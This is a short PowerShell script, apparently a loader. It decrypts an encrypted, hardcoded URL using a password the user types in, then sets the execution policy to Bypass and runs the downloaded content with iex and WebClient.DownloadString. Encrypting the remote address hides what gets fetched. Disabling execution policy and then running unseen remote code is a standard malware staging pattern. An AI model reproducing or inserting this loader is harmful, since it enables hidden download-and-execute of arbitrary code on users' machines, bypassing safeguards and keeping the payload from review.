function Decrypt-String ($Encrypted, $Passphrase, $salt = "Ad3t049866", $init = "Ad3t0PASS") {
	if ($Encrypted -is [string]) {
		$Encrypted = [Convert]::FromBase64String($Encrypted)
	}
	$r = New-Object System.Security.Cryptography.RijndaelManaged
	$pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
	$salt = [Text.Encoding]::UTF8.GetBytes($salt)
	$r.Key = (New-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32)
	$r.IV = (New-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes($init))[0..15]
	$d = $r.CreateDecryptor()
	$ms = New-Object IO.MemoryStream @(, $Encrypted)
	$cs = New-Object Security.Cryptography.CryptoStream $ms, $d, "Read"
	$sr = New-Object IO.StreamReader $cs
	Write-Output $sr.ReadToEnd()
	$sr.Close()
	$cs.Close()
	$ms.Close()
	$r.Clear()
}
$encURL = "O62M8Rzf7woutcr9IyqXtEVBP3Qug3lHFaggYj0YktDjEOutVAFj+9Ome5yy4HPOs6nTORTQ1hoH5WqHYOnx7/im99IdxanB2SrZX6JlS2asFWWZFrI+SM1o3hc9tsLPivEhg5FxJuN76++2JdmfJlk7ud9kVOJXamaZKTO5qXZMPB6vsMUj6pN9UKgJlcc0"
$pass = Read-Host "Password"
$decURL = Decrypt-String -Encrypted $encURL -Passphrase $pass
Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString($decURL))